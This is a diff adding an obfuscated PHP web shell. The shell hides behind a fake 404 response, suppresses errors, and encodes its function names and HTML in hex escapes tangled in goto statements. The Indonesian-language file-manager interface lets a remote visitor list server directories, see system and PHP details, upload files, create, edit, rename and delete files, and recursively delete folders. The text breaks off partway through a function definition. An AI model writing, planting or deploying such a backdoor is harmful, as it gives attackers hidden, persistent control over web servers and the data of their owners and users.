@@ -1,0 +1,1414 @@
+<?php
+ob_start();
+header("Pragma: no-cache");
+error_reporting(0);
+ignore_user_abort(true);
+set_time_limit(0);
+http_response_code(404);
+goto Q9DaZ;
+BhUHP:
+LqmtM:
+goto cZ7rQ;
+YCgwW:
+sLpJ1:
+goto hinHH;
+oA9pn:
+yIEkN:
+goto kyWyH;
+EVNmv:
+if (
+    !move_uploaded_file(
+        $_FILES[base64_decode("\x5a\x6d\x6c\x73\132\x58\x4d\x3d")][
+            base64_decode("\144\x47\x31\167\130\62\65\150\142\x57\125\x3d")
+        ][$F2fQZ],
+        $yOnSL[$F2fQZ]
+    )
+) {
+    goto edGbj;
+}
+goto MQ0QJ;
+SqYOx:
+echo "\74\x68\x35\40\x63\154\141\163\163\x3d\x22\x70\55\x31\40\x72\x61\x69\156\x62\157\167\55\142\x6f\x72\x64\x65\x72\42\76\122\x65\x6e\x61\155\145\40\106\151\154\145\40\72\40";
+goto EbEQO;
+tDaVw:
+ot7pm:
+goto Mb3kC;
+HY4DY:
+goto h1iXb;
+goto TPGco;
+hinHH:
+if (!($NQXGF == "\x6e\x65\x77\104\x69\x72")) {
+    goto qauf4;
+}
+goto OO8Em;
+ZE1E2:
+goto FDzqw;
+goto MBQ5t;
+o_Iae:
+if (isset($_GET["\141"])) {
+    goto dPlVT;
+}
+goto Ti4zu;
+hV3aU:
+dPlVT:
+goto wCXsp;
+ai5BC:
+foreach ($WPq81 as $eFX49 => $uvA5e) {
+    goto zVCuR;
+    Uh8Rc:
+    echo "\x32\x66";
+    goto Z6qdx;
+    d0GCk:
+    goto VbqXz;
+    goto KG6E4;
+    LIiW1:
+    goto aWcq8;
+    goto ZxiY9;
+    TicXp:
+    goto bQl6Y;
+    goto MvHOr;
+    yGuno:
+    E5bop:
+    goto czME7;
+    fsj3J:
+    goto bBFIV;
+    goto Zi0qW;
+    RMua1:
+    echo wS8yC($WPq81[$I31U7]);
+    goto NMsZX;
+    nyEsh:
+    aWcq8:
+    goto U_Qwi;
+    uIf1w:
+    $I31U7 = 0;
+    goto nyEsh;
+    czME7:
+    $I31U7++;
+    goto LIiW1;
+    juiDg:
+    echo "\x3c\141\40\x68\162\x65\146\75\x22\77\160\75\x32\146\42\40\143\154\x61\163\163\x3d\x22\143\157\155\x62\145\164\x22\76\x7e\x3c\57\141\x3e\57";
+    goto u12Eq;
+    ZxiY9:
+    Ofc0z:
+    goto rjkm5;
+    m5yZo:
+    zoYjy:
+    goto fsj3J;
+    zVCuR:
+    if ($eFX49 == 0 && $uvA5e == "") {
+        goto EMwYR;
+    }
+    goto d0GCk;
+    MvHOr:
+    jZoOT:
+    goto Uh8Rc;
+    HmFEN:
+    UywXz:
+    goto RMua1;
+    rjkm5:
+    echo "\42\x3e{$uvA5e}\x3c\x2f\141\76\x2f";
+    goto eh02t;
+    wzMxX:
+    goto eTMbj;
+    goto m5yZo;
+    eh02t:
+    bBFIV:
+    goto NYgrt;
+    rZhu6:
+    VbqXz:
+    goto mMV2Z;
+    NYgrt:
+    ND616:
+    goto HJZ2N;
+    W_qdE:
+    goto Ofc0z;
+    goto HmFEN;
+    U_Qwi:
+    if ($I31U7 <= $eFX49) {
+        goto UywXz;
+    }
+    goto W_qdE;
+    G8u7V:
+    echo "\x3c\141\40\143\154\x61\x73\163\x3d\42\143\x6f\155\x62\x65\164\x22\x20\x68\162\145\146\75\x22\77\x70\75";
+    goto uIf1w;
+    Zi0qW:
+    eTMbj:
+    goto G8u7V;
+    NMsZX:
+    if ($I31U7 != $eFX49) {
+        goto jZoOT;
+    }
+    goto TicXp;
+    KG6E4:
+    EMwYR:
+    goto juiDg;
+    u12Eq:
+    goto bBFIV;
+    goto rZhu6;
+    mMV2Z:
+    if ($uvA5e == "") {
+        goto zoYjy;
+    }
+    goto wzMxX;
+    Z6qdx:
+    bQl6Y:
+    goto yGuno;
+    HJZ2N:
+}
+goto e0de7;
+GAIAY:
+edGbj:
+goto CT_V8;
+uCfiP:
+echo "\74\57\x66\157\156\x74\x3e\x3c\x2f\150\65\76\xd\12\74\144\151\166\40\143\154\x61\163\x73\75\42\146\157\x72\x6d\55\147\x72\x6f\165\x70\x22\76\xd\12\x3c\x74\x65\170\x74\x61\x72\x65\141\x20\x6e\141\155\145\75\x22\143\164\x6e\x22\40\151\144\x3d\x22\x63\164\x6e\42\40\x63\157\154\163\x3d\x22\63\60\x22\40\162\157\167\163\75\42\x31\x30\42\x20\x63\x6c\141\163\x73\x3d\x22\x66\x6f\x72\155\55\x63\x6f\x6e\x74\162\157\x6c\x20\162\x61\151\156\x62\x6f\167\x2d\x62\157\x72\x64\145\162\42\x20\162\145\x61\144\157\156\x6c\171\x3e";
+goto sGXhT;
+L1LIo:
+echo "\74\150\x35\40\143\x6c\x61\163\163\x3d\42\x70\55\61\x20\x72\x61\x69\x6e\x62\157\x77\55\142\x6f\162\x64\145\x72\x22\40\x73\x74\x79\x6c\145\x3d\x22\164\145\x78\164\55\141\x6c\x69\147\x6e\x3a\40\x63\x65\x6e\164\x65\x72\73\42\76\105\144\151\x74\x20\106\151\154\x65\x20\x4e\x61\155\x65\x20\x3a\40\x3c\x66\157\x6e\164\x20\x63\157\x6c\x6f\x72\75\x22\x77\x68\x69\164\145\42\x3e";
+goto dB4Yg;
+O8VNO:
+if (file_exists("{$ZOq50}\57{$fywZb}")) {
+    goto i8J3D;
+}
+goto h54Wj;
+e0GMa:
+echo $_SERVER["\x53\x45\122\x56\x45\x52\137\123\117\x46\124\127\x41\122\x45"];
+goto eN4q8;
+Q9xzM:
+echo "\x22\x20\143\154\141\163\163\75\x22\x6f\150\x63\164\x22\x3e\x42\x75\x61\x74\40\x46\151\154\x65\74\x2f\141\76\40\x7c\40\74\141\40\150\162\x65\146\75\42\x3f\160\x3d";
+goto eoU6M;
+rGH0L:
+if ($I31U7 < count($kUaLk)) {
+    goto w8Qz0;
+}
+goto oOUFy;
+qUuUY:
+header(
+    base64_decode(
+        "\x51\x32\x39\165\x64\107\x56\x75\144\x43\61\125\x65\130\x42\154\117\151\x42\x68\143\x48\102\163\141\x57\116\150\144\107\x6c\x76\142\151\x39\x76\131\63\x52\x6c\x64\x43\x31\172\x64\x48\112\154\131\127\x30\x3d"
+    )
+);
+goto xaGbA;
+yd7FP:
+$kUaLk[$I31U7] = aai_V($kUaLk[$I31U7]);
+goto OvwO5;
+kyWyH:
+NIRsp:
+goto xteZg;
+PM_uh:
+lC0U4(
+    "\146\141\x69\x6c\x65\144\x20\x74\x6f\x20\144\145\154\145\x74\145\40\x74\150\x65\40\x66\x69\154\145",
+    0
+);
+goto uP5sb;
+OEjZh:
+echo "\x3c\57\x74\145\170\164\141\x72\145\x61\x3e\xd\12\x3c\x2f\144\x69\166\x3e\xd\xa\74\x64\x69\x76\x20\x63\154\141\163\163\x3d\x22\146\x6f\x72\155\x2d\x67\x72\x6f\x75\x70\x22\x20\163\x74\x79\154\145\75\42\155\x61\x72\147\x69\156\x2d\164\x6f\x70\72\x20\x31\x30\160\170\73\42\x3e\xd\12\x3c\142\x75\164\164\157\156\x20\164\171\x70\x65\75\42\x73\165\142\155\x69\x74\42\x20\x6e\x61\155\x65\75\42\163\42\40\x63\154\141\163\163\75\x22\x6f\x68\x63\164\42\76\x53\141\166\145\x3c\x2f\x62\165\x74\x74\157\x6e\x3e\15\xa\x3c\x2f\x64\x69\x76\76\15\12\74\x2f\x66\157\162\x6d\x3e\xd\12";
+goto JpCBk;
+Xe6VP:
+echo "\x3c\57\146\157\x6e\164\x3e\x3c\x2f\x68\65\76\xd\xa\x3c\146\x6f\x72\x6d\x20\x6d\x65\164\x68\x6f\x64\x3d\42\160\x6f\163\164\x22\x3e\15\xa\74\x64\x69\x76\40\143\x6c\x61\163\163\x3d\x22\x66\157\162\155\x2d\147\162\157\x75\160\x22\x3e\15\xa\x3c\x74\145\x78\164\x61\x72\x65\x61\40\x6e\x61\x6d\x65\75\42\143\164\x6e\x22\x20\151\x64\x3d\x22\x63\164\x6e\42\x20\x63\157\x6c\x73\x3d\42\63\x30\42\40\x72\157\167\x73\x3d\42\61\60\x22\x20\x63\154\x61\163\x73\75\x22\146\157\x72\x6d\55\143\x6f\x6e\164\x72\157\154\40\x72\141\x69\x6e\x62\157\167\55\x62\x6f\x72\x64\145\162\42\76";
+goto mK6iN;
+s1ZqH:
+foreach ($Fyo07 as $m3aXF) {
+    goto OdvIH;
+    dD16m:
+    echo "\xd\12\74\164\x72\76\xd\12\x3c\x74\x64\x20\x73\164\x79\154\145\75\42\164\145\x78\164\x2d\x61\x6c\151\x67\156\x3a\x20\154\x65\146\x74\x3b\x22\76\15\12\74\x69\x20\143\154\141\163\x73\x3d\x22\x66\141\x20\x66\x61\x2d\x66\167\40\x66\x61\55\x66\x69\x6c\145\55\157\x22\40\163\x74\171\154\145\x3d\x22\x62\157\162\144\145\162\x3a\x20\60\73\x70\141\144\x64\x69\x6e\x67\x3a\x20\60\73\x77\151\144\x74\x68\x3a\40\61\56\62\x38\65\67\61\x34\62\71\145\x6d\x3b\x22\76\x3c\57\x69\76\x3c\141\x20\x68\x72\x65\146\x3d\42\x3f\160\x3d" .
+        wS8YC($ZOq50) .
+        "\x26\x61\x3d" .
+        WS8yc("\166\x69\x65\x77") .
+        "\46\156\x3d" .
+        wS8Yc($m3aXF) .
+        "\42\x20\x64\x61\164\x61\55\x74\157\x67\147\154\145\x3d\42\x74\x6f\157\154\164\x69\160\42\x20\144\141\x74\x61\x2d\160\x6c\141\143\145\155\145\x6e\164\x3d\x22\141\x75\164\157\x22\x20\x74\x69\164\x6c\145\x3d\42\114\x61\x74\145\x73\x74\x20\x6d\x6f\144\x69\x66\x79\40\x6f\156\x20" .
+        $kUaLk[19](
+            "\x59\55\155\x2d\144\x20\x48\x3a\x69",
+            $kUaLk[20]("{$ZOq50}\57{$m3aXF}")
+        ) .
+        "\42\76{$m3aXF}\74\57\141\76\x3c\x2f\x74\144\x3e\15\12\74\x74\x64\x3e\x3c\163\x70\141\156\x3e{$Pnfzz}\74\x2f\163\160\141\x6e\x3e\74\x2f\x74\x64\76\15\12\74\164\x64\76\x3c\146\157\x6e\164\x20\143\157\154\x6f\x72\75\x22" .
+        ($kUaLk[8]("{$ZOq50}\x2f{$m3aXF}")
+            ? "\43\x30\x30\146\x66\x30\x30"
+            : (!$kUaLk[9]("{$ZOq50}\x2f{$m3aXF}")
+                ? "\x23\x30\60\x62\x66\146\x66"
+                : null)) .
+        "\x22\76" .
+        chd02("{$ZOq50}\x2f{$m3aXF}") .
+        "\x3c\x2f\146\x6f\156\x74\x3e\x3c\x2f\164\144\76\15\xa\x3c\164\144\x3e\74\x61\40\150\162\x65\146\75\42\77\x70\75" .
+        wS8YC($ZOq50) .
+        "\x26\x61\x3d" .
+        Ws8YC("\145\144\x69\x74") .
+        "\x26\156\x3d" .
+        ws8Yc($m3aXF) .
+        "\x22\x20\x64\141\164\141\55\x74\x6f\147\x67\154\x65\75\x22\164\x6f\157\154\164\151\160\x22\x20\144\141\164\x61\x2d\x70\154\141\x63\x65\x6d\145\x6e\164\x3d\x22\x61\165\x74\157\42\x20\164\x69\x74\x6c\145\75\x22\x45\x64\x69\x74\42\76\105\144\x69\164\x3c\57\141\x3e\x3c\x2f\x74\x64\76\xd\xa\74\x74\144\x3e\74\x61\40\x68\162\x65\x66\75\x22\x3f\x70\x3d" .
+        WS8YC($ZOq50) .
+        "\x26\x61\75" .
+        wS8YC("\x72\145\156\x61\x6d\145") .
+        "\x26\x6e\75" .
+        Ws8Yc($m3aXF) .
+        "\46\x74\75\146\x22\x20\x64\x61\164\141\55\164\157\x67\x67\x6c\x65\x3d\42\164\x6f\x6f\x6c\x74\x69\x70\42\40\144\x61\x74\x61\x2d\x70\154\141\x63\x65\155\145\x6e\x74\75\42\x61\165\164\x6f\x22\x20\x74\x69\x74\x6c\x65\x3d\42\122\145\156\x61\x6d\x65\x22\x3e\122\145\156\141\x6d\x65\x3c\57\141\x3e\74\57\x74\x64\x3e\xd\xa\x3c\164\x64\x3e\74\141\x20\150\x72\145\x66\75\x22\77\x70\75" .
+        ws8Yc($ZOq50) .
+        "\x26\x61\x3d" .
+        WS8yc("\144\x65\x6c\145\164\145") .
+        "\46\x6e\75" .
+        WS8yC($m3aXF) .
+        "\42\40\x63\154\141\163\x73\75\42\x64\x65\154\x65\x74\145\x22\40\x64\141\x74\x61\55\x74\x79\160\145\x3d\42\146\x69\x6c\145\x22\40\144\x61\164\141\55\164\x6f\x67\x67\x6c\145\x3d\42\x74\157\x6f\x6c\164\151\160\42\x20\144\141\x74\x61\x2d\x70\154\141\x63\145\x6d\145\156\164\x3d\42\141\165\164\x6f\42\40\164\x69\164\x6c\x65\x3d\42\104\x65\154\x65\x74\145\42\x3e\104\145\154\145\x74\145\x3c\x2f\141\x3e\74\x2f\x74\x64\x3e\15\xa\74\57\164\162\x3e";
+    goto ZriiZ;
+    F2s3D:
+    rdpta:
+    goto u3FyP;
+    u3FyP:
+    goto ObFq0;
+    goto Hbr7N;
+    YZzDO:
+    $Pnfzz = round($Pnfzz, 3);
+    goto JKGyq;
+    IOSzh:
+    TGMtn:
+    goto nxlc6;
+    ZriiZ:
+    ObFq0:
+    goto IOSzh;
+    Hbr7N:
+    AKMIa:
+    goto Ot1VV;
+    tGoLQ:
+    goto AKMIa;
+    goto F2s3D;
+    Ot1VV:
+    $Pnfzz = $kUaLk[10]("{$ZOq50}\57{$m3aXF}") / 1024;
+    goto YZzDO;
+    JKGyq:
+    $Pnfzz =
+        $Pnfzz > 1024
+            ? round($Pnfzz / 1024, 2) . "\40\40\x4d\x42"
+            : $Pnfzz . "\x20\x20\x4b\x42";
+    goto dD16m;
+    OdvIH:
+    if (!$kUaLk[7]("{$ZOq50}\x2f{$m3aXF}")) {
+        goto rdpta;
+    }
+    goto tGoLQ;
+    nxlc6:
+}
+goto oA9pn;
+l5Fqe:
+$I31U7++;
+goto Z4CZB;
+AZiP8:
+jMGUz:
+goto p5apK;
+D3pHJ:
+echo "\74\x2f\x74\x65\x78\x74\141\x72\145\x61\76\xd\xa\x3c\57\x64\x69\x76\76\xd\xa";
+goto tDaVw;
+W1QSn:
+if (isset($_POST["\x73"])) {
+    goto sRhmp;
+}
+goto g9E7J;
+S5Gap:
+Vt8Zo:
+goto Ayxvv;
+nw1VR:
+set_time_limit(0);
+goto IXbHB;
+P7aIc:
+goto rfF67;
+goto Hf5GT;
+bkCX3:
+if (!($NQXGF == "\x72\145\156\x61\155\x65")) {
+    goto EEsPd;
+}
+goto KFaxN;
+H0tPl:
+yGOX0:
+goto L1LIo;
+k8NQG:
+if (!file_exists($ESfUo)) {
+    goto jMGUz;
+}
+goto PM_uh;
+Aiqc_:
+if (!file_exists($ESfUo)) {
+    goto VeUtG;
+}
+goto O4u0V;
+e0de7:
+wHP3u:
+goto wVwmQ;
+MrBby:
+oed56:
+goto J4dWr;
+tyoj3:
+echo "\74\x2f\x73\160\141\156\x3e\x3c\57\154\151\x3e\xd\12\74\x6c\151\x3e\x53\145\x72\166\145\x72\x20\123\x6f\x66\x74\167\141\x72\145\40\x3a\40\74\163\160\141\156\40\x73\x74\171\x6c\x65\x3d\42\143\x6f\154\157\x72\72\40\x77\x68\151\x74\145\73\42\76";
+goto e0GMa;
+XXgUY:
+echo "\42\40\x63\x6c\141\x73\163\x3d\x22\x6f\x68\x63\164\x22\x3e\102\165\x61\x74\x20\x46\157\x6c\144\x65\162\74\x2f\x61\76\74\x2f\x6c\x69\x3e\xd\12\74\154\x69\x3e\15\xa\x20\40\40\x20\40\x20\x20\40\40\40\x20\40\x3c\146\x6f\x72\155\x20\x6d\x65\x74\150\x6f\144\x3d\42\160\x6f\x73\164\42\x20\x65\156\143\x74\x79\160\x65\x3d\42\155\165\154\164\x69\x70\x61\x72\164\57\x66\157\162\x6d\55\x64\141\x74\x61\42\40\163\x74\171\154\145\x3d\42\144\x69\163\x70\154\x61\x79\x3a\40\151\156\154\x69\x6e\x65\x2d\x62\x6c\x6f\143\153\73\42\x3e\15\12\40\40\40\40\74\x69\x6e\x70\x75\164\40\x74\x79\x70\x65\75\x22\x66\151\154\x65\x22\x20\x6e\x61\155\x65\75\x22\146\151\x6c\x65\163\133\x5d\x22\76\xd\12\x20\x20\40\40\x3c\151\156\160\x75\x74\40\164\x79\x70\x65\75\42\x73\x75\142\x6d\151\x74\x22\40\x76\x61\x6c\165\145\x3d\x22\x55\x70\154\157\141\144\x22\40\x6e\x61\x6d\145\75\42\x73\x75\142\x6d\151\x74\42\x20\143\154\141\x73\x73\x3d\x22\142\x75\x74\164\157\x6e\40\157\x68\x63\x74\x22\x3e\15\12\x3c\57\146\157\162\155\76\74\x2f\154\151\x3e\xd\12\x20\x20\x20";
+goto RtR17;
+kCgwl:
+VeUtG:
+goto bPzko;
+HIFxM:
+if (file_put_contents($QG8P5, $_POST["\143\x74\156"])) {
+    goto G_59n;
+}
+goto jgid3;
+Q5mN4:
+goto fgGSq;
+goto zbEsG;
+thPeC:
+echo phpversion();
+goto cYWR5;
+NmN3V:
+YcboE:
+goto rGH0L;
+n_UfN:
+function QjXa3($hJmOS)
+{
+    goto WD1d5;
+    egxjU:
+    if (!(is_dir($hJmOS) && array_diff(scandir($hJmOS), ["\56", "\56\x2e"]))) {
+        goto lA90w;
+    }
+    goto vE0DK;
+    nzC5R:
+    if (trim(pathinfo($hJmOS, PATHINFO_BASENAME), "\56") === "") {
+        goto VaR6x;
+    }
+    goto w3XK0;
+    vE0DK:
+    goto DoJ5o;
+    goto mqlEH;
+    YZrrd:
+    DoJ5o:
+    goto YwtxN;
+    Key51:
+    rmdir($hJmOS);
+    goto GC3Qp;
+    GC3Qp:
+    return;
+    goto YZrrd;
+    YwtxN:
+    array_map(function ($SujOB) use ($hJmOS) {
+        goto yvahK;
+        S0ZRF:
+        IJSwd:
+        goto zzT8r;
+        yvahK:
+        $hj1Rx = $hJmOS . DIRECTORY_SEPARATOR . $SujOB;
+        goto gmtn3;
+        KQChh:
+        QjXa3($hj1Rx);
+        goto S0ZRF;
+        igs4O:
+        unlink($hj1Rx);
+        goto PVufK;
+        gmtn3:
+        if (is_dir($hj1Rx)) {
+            goto O30lt;
+        }
+        goto igs4O;
+        PVufK:
+        goto IJSwd;
+        goto VFZxq;
+        VFZxq:
+        O30lt:
+        goto KQChh;
+        zzT8r:
+    }, array_diff(scandir($hJmOS), ["\56", "\x2e\x2e"]));
+    goto pmw6t;
+    LZLhG:
+    vNMWH:
+    goto egxjU;
+    rfa01:
+    return;
+    goto LZLhG;
+    VyjKV:
+    VaR6x:
+    goto rfa01;
+    mqlEH:
+    lA90w:
+    goto Key51;
+    pmw6t:
+    rmdir($hJmOS);
+    goto ywlUj;
+    w3XK0:
+    goto vNMWH;
+    goto VyjKV;
+    WD1d5:
+    global $kUaLk;
+    goto nzC5R;
+    ywlUj:
+}
+goto qjMFf;
+Hf5GT:
+F5YiP:
+goto Le70S;
+QB4ei:
+G_59n:
+goto zpXjo;
+TeNYf:
+vECAl:
+goto B58GU;
+f6I3q:
+$Fyo07 = "\163\143\141\x6e\144\x69\162";
+goto hqAXx;
+i0zln:
+U1y2A:
+goto U5VAb;
+WYKty:
+unlink($ESfUo);
+goto k8NQG;
+XwUc7:
+error_reporting(0);
+goto mxV6n;
+gRkHM:
+FDzqw:
+goto Pjeyi;
+MUk82:
+zK72J:
+goto OKahF;
+OKahF:
+fgGSq:
+goto IhOyE;
+Le70S:
+$NQXGF = aai_v($_GET["\x61"]);
+goto AuqTR;
+TPGco:
+w6yqb:
+goto Vhi3S;
+e6uej:
+HIpFR:
+goto CzV5w;
+cnh5c:
+goto ot7pm;
+goto mb_Ys;
+Pjeyi:
+echo "\74\x2f\x64\x69\x76\76\15\12\74\144\x69\166\x20\143\x6c\141\x73\163\x3d\42\x74\141\x62\154\x65\x2d\162\145\163\x70\x6f\156\x73\151\x76\x65\40\x74\x65\170\x74\x2d\x6c\x69\147\150\x74\40\162\141\151\156\x62\x6f\x77\55\x62\x6f\x72\144\x65\x72\42\x20\163\164\171\154\145\75\x22\x74\x65\x78\164\55\141\154\x69\147\x6e\72\x20\154\x65\x66\x74\73\x70\x61\144\144\151\x6e\147\x3a\40\x34\160\x78\73\x6d\141\x72\147\x69\x6e\55\x62\157\x74\164\x6f\155\x3a\40\x33\x70\170\x3b\155\x61\162\147\151\x6e\55\164\157\x70\x3a\40\63\160\x78\73\42\76\xd\12\74\154\x69\76\104\x69\162\x20\x3a\40\x3c\x73\160\141\156\x3e";
+goto c6Z4C;
+sWrad:
+goto lelHt;
+goto MUk82;
+ZQAoz:
+ttQVw:
+goto eZ0tM;
+gOQR9:
+goto sLpJ1;
+goto e6uej;
+hqAXx:
+$kUaLk = [
+    "\x37\x30\66\70\x37\60\65\146\67\65\x36\x65\66\x31\x36\x64\66\x35",
+    "\x37\60\66\x38\x37\60\x37\66\66\x35\x37\62\x37\x33\x36\x39\x36\146\x36\145",
+    "\x36\67\66\65\67\x34\66\x33\x37\67\x36\x34",
+    "\66\x33\x36\x38\x36\x34\x36\x39\67\x32",
+    "\x37\x30\x37\62\x36\65\66\67\65\146\x37\x33\x37\x30\66\x63\66\x39\67\64",
+    "\x36\x31\x37\62\x37\x32\66\x31\x37\x39\x35\146\x36\64\66\x39\66\66\x36\x36",
+    "\66\71\67\63\x35\x66\x36\64\66\x39\67\62",
+    "\x36\71\x37\x33\x35\146\66\x36\66\x39\66\x63\x36\x35",
+    "\66\71\67\x33\x35\x66\67\67\x37\62\66\x39\x37\x34\x36\x31\x36\62\66\143\66\x35",
+    "\x36\x39\x37\x33\x35\x66\67\62\66\65\x36\x31\66\x34\66\x31\66\x32\x36\143\x36\x35",
+    "\x36\x36\x36\71\x36\x63\66\x35\x37\x33\x36\x39\67\x61\66\65",
+    "\66\63\x36\146\67\x30\67\x39",
+    "\x36\x36\66\71\66\x63\x36\65\x35\146\66\x35\67\70\x36\x39\67\x33\67\64\67\x33",
+    "\66\x36\x36\x39\x36\143\66\65\x35\146\x37\60\x37\x35\67\x34\x35\x66\x36\63\66\x66\x36\x65\67\x34\x36\x35\x36\145\x37\x34\x37\63",
+    "\x36\66\x36\x39\66\143\x36\65\65\x66\66\x37\x36\65\x37\64\65\146\x36\x33\x36\146\66\145\x37\64\66\65\66\x65\67\x34\67\63",
+    "\66\x64\66\142\x36\x34\x36\x39\x37\62",
+    "\67\62\x36\65\x36\x65\x36\61\x36\144\66\x35",
+    "\x37\x33\67\x34\67\62\67\64\x36\x66\67\x34\66\71\x36\144\x36\x35",
+    "\x36\70\67\x34\x36\x64\x36\143\67\63\x37\x30\x36\65\x36\63\66\71\x36\61\x36\143\x36\x33\66\x38\66\x31\x37\62\67\63",
+    "\x36\64\66\61\x37\x34\x36\65",
+    "\66\66\66\x39\66\143\66\65\66\144\67\x34\66\71\x36\x64\x36\65",
+];
+goto SxW0v;
+ILsG6:
+goto fgGSq;
+goto YlHfn;
+C3vHP:
+$fywZb = $_POST[base64_decode("\x62\147\x3d\75")];
+goto O8VNO;
+p5apK:
+LC0u4(
+    "\x66\x69\x6c\145\40\144\145\154\x65\164\145\144\x20\x73\x75\x63\143\x65\x73\163\146\x75\x6c\x6c\x79"
+);
+goto TeNYf;
+fY1W9:
+echo "\74\150\x35\40\143\x6c\x61\x73\163\75\x22\160\55\61\40\x72\x61\151\x6e\x62\157\x77\55\x62\x6f\x72\x64\145\x72\x22\x20\163\x74\171\x6c\x65\x3d\42\164\x65\x78\x74\x2d\141\154\x69\x67\156\72\x20\x63\x65\x6e\x74\145\162\x3b\42\x3e\x4e\x61\x6d\x61\x20\x46\x6f\x6c\144\x65\162\x20\x42\141\x72\x75\40\x3a\74\x2f\150\x35\x3e\xd\xa\x3c\x66\157\x72\x6d\x20\155\145\164\150\x6f\x64\75\x22\x70\157\x73\164\x22\x3e\xd\12\74\x64\151\x76\x20\143\154\x61\x73\x73\75\x22\x66\157\162\155\55\147\162\157\165\160\42\76\xd\12\x3c\151\156\160\x75\164\40\156\141\155\145\75\42\156\42\40\x69\144\75\42\x6e\x22\40\143\154\141\163\x73\75\x22\142\x6f\x72\144\x65\162\x20\160\x2d\x31\x22\40\141\165\x74\157\143\157\x6d\x70\x6c\x65\164\145\x3d\42\x6f\x66\x66\x22\40\x73\x74\171\x6c\145\x3d\x22\x74\145\x78\164\x2d\141\x6c\151\x67\x6e\72\x20\x63\145\x6e\164\x65\x72\x3b\42\x3e\15\12\74\x2f\144\151\x76\76\xd\xa\x3c\144\151\166\x20\143\154\x61\x73\x73\x3d\x22\146\x6f\x72\x6d\x2d\147\162\157\x75\160\42\x20\163\x74\171\x6c\x65\x3d\x22\x6d\141\162\x67\x69\x6e\55\164\x6f\x70\x3a\40\61\60\160\170\x3b\x22\76\15\xa\74\142\x75\164\x74\157\x6e\x20\164\171\160\145\75\42\x73\165\x62\155\x69\x74\42\40\156\141\x6d\145\75\42\x73\42\x20\x63\154\x61\163\163\x3d\42\x6f\x68\x63\164\42\76\x43\162\145\141\x74\145\74\57\x62\165\164\164\157\156\x3e\15\xa\x3c\57\x64\x69\x76\x3e\x20\xd\xa\x3c\57\x66\157\162\x6d\x3e\x20\xd\xa";
+goto KSJAC;
+eN4q8:
+echo "\x3c\57\163\x70\x61\156\76\74\x2f\x6c\x69\76\15\xa\x3c\x6c\151\x3e\x50\110\x50\x20\x56\x65\x72\163\151\x6f\156\40\x3a\40\74\163\x70\141\156\40\163\x74\171\x6c\x65\x3d\x22\143\157\154\157\x72\x3a\40\167\x68\x69\x74\x65\x3b\42\x3e";
+goto thPeC;
+eZ0tM:
+goto rMnkO;
+goto BhUHP;
+xaGbA:
+header(
+    base64_decode(
+        "\x51\62\71\165\144\x47\x56\165\144\x43\61\x55\x63\155\x46\x75\x63\x32\132\x6c\143\x69\61\106\x62\x6d\116\166\132\x47\x6c\x75\132\x7a\157\147\x51\155\154\165\x59\x58\x4a\x35"
+    )
+);
+goto tms6I;
+Q9DaZ:
+header("\120\x72\x61\147\x6d\141\x3a\x20\156\157\x2d\143\141\x63\150\145");
+goto XwUc7;
+IXbHB:
+http_response_code(404);
+goto f6I3q;
+Veg32:
+echo "\x3c\150\x35\x20\x63\x6c\141\163\x73\75\x22\x70\55\x31\x20\x72\x61\x69\156\142\x6f\x77\x2d\142\x6f\x72\x64\x65\162\42\x20\163\164\171\154\x65\x3d\42\x74\x65\x78\x74\x2d\141\154\151\x67\156\x3a\40\x63\145\156\164\x65\162\x3b\x22\76\x4e\141\x6d\141\x20\106\x69\154\x65\x20\102\x61\162\165\40\72\x3c\57\150\65\76\xd\xa\74\x66\x6f\162\155\40\x6d\145\x74\150\x6f\x64\75\42\160\157\163\x74\x22\x3e\xd\12\74\144\151\166\40\143\154\x61\x73\x73\x3d\42\146\157\162\x6d\55\x67\162\157\165\160\x22\x3e\xd\12\74\x69\x6e\160\x75\164\40\164\171\160\145\x3d\x22\x74\145\x78\164\x22\x20\156\x61\155\x65\75\42\156\42\40\151\x64\75\42\156\42\x20\x63\154\x61\x73\163\x3d\42\142\x6f\x72\x64\x65\162\x20\x70\55\61\42\x20\160\154\141\143\x65\150\157\x6c\x64\x65\x72\75\x22\42\40\x73\x74\x79\154\x65\75\x22\x74\x65\170\x74\55\141\154\x69\147\x6e\72\x20\143\x65\x6e\164\x65\x72\x3b\42\x3e\15\12\x3c\57\x64\x69\166\76\15\xa\x3c\x64\x69\x76\40\143\x6c\141\x73\163\x3d\x22\146\157\x72\x6d\55\x67\162\x6f\165\160\x22\76\15\12\x3c\x74\145\170\164\x61\x72\145\x61\40\x73\x74\171\154\145\x3d\42\162\x65\x73\x69\172\145\72\156\157\156\145\x22\40\x6e\141\155\145\75\42\x63\x74\x6e\x22\x20\x69\144\75\42\x63\x74\156\x22\40\143\x6f\x6c\x73\x3d\x22\63\60\42\x20\162\x6f\167\163\75\42\61\60\x22\x20\x63\154\141\163\163\75\x22\146\157\x72\x6d\x2d\x63\x6f\156\x74\x72\x6f\x6c\x20\162\x61\x69\x6e\x62\x6f\x77\55\142\157\162\144\x65\162\x22\x20\x70\x6c\x61\x63\145\x68\157\x6c\144\x65\x72\75\42\x22\x3e\74\x2f\164\x65\x78\164\141\x72\x65\x61\76\xd\12\x3c\57\144\151\166\76\xd\xa\x3c\144\x69\166\x20\x63\154\141\163\x73\x3d\42\x66\x6f\x72\155\55\147\162\157\165\160\x22\x20\163\164\x79\x6c\145\x3d\x22\x6d\x61\162\x67\151\x6e\55\164\157\160\x3a\x20\x31\60\x70\170\x3b\x22\x3e\xd\xa\74\x62\x75\164\164\157\x6e\x20\x74\171\160\x65\75\42\x73\165\142\155\151\164\42\40\156\x61\x6d\145\75\x22\163\x22\40\x63\x6c\x61\163\163\x3d\x22\x6f\150\143\x74\x22\x3e\x43\x72\145\141\x74\145\74\57\x62\x75\x74\x74\157\156\76\x20\15\xa\74\x2f\x64\151\166\76\15\12\74\x2f\146\157\x72\x6d\76\15\xa";
+goto W1QSn;
+wE5i2:
+w8Qz0:
+goto yd7FP;
+bPzko:
+lc0U4(
+    "\x66\x6f\154\x64\145\162\x20\x64\x65\154\145\164\145\x64\40\163\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\171"
+);
+goto qJfne;
+cYWR5:
+echo "\x3c\x2f\x73\160\141\x6e\x3e\x3c\x2f\x6c\151\76\xd\12\x3c\x6c\x69\76\74\141\40\150\162\145\x66\75\42\x3f\x70\75";
+goto HeRBf;
+MnBVi:
+echo php_uname();
+goto tyoj3;
+H2sSQ:
+goto tiiqa;
+goto oGiEb;
+Zy5p0:
+function LC0u4($sAw08, $nWHPm = 1, $ESfUo = "")
+{
+    goto XsnzR;
+    rGAg0:
